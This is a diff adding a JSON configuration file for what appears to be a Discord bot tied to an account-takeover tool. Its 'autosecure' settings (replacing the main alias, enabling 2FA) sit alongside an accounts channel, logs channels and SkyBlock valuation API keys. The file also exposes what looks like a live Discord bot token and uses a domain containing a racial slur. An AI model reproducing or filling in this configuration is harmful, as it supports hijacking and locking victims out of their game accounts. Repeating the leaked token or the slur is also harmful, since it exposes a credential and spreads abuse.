@@ -1,0 +1,27 @@
+{
+    "owners": [ 1182808885313155133 ],
+    "tokens": {
+        "bot_token": "MTUyNDc0NDYyNTg5NjgxNjY5MQ.G3WpNX.p4Mh372iyZonEUuJmF9QquF7hYm3zOnx5SiBCw",
+        "skytools_key": "YOUR_SKYTOOLS_KEY",
+        "donut_key": "YOUR_DONUT_KEY"
+    },
+    "discord": {
+        "logs_channel": "1520601275291402360",
+        "accounts_channel": "1520600357213044867",
+        "censored_logs_channel": "1520480929494077611"
+    },
+    "autosecure": {
+        "replace_main_alias": true,
+        "enable_2fa": true,
+        "minecon_mode": false
+    },
+    "web": {
+        "credentials": {
+            "username": "<kxr>",
+            "password": "<kxr>",
+            "jwt_secret": "",
+            "totp_secret": ""
+        }
+    },
+    "domain": "niggerdigger.online"
+}
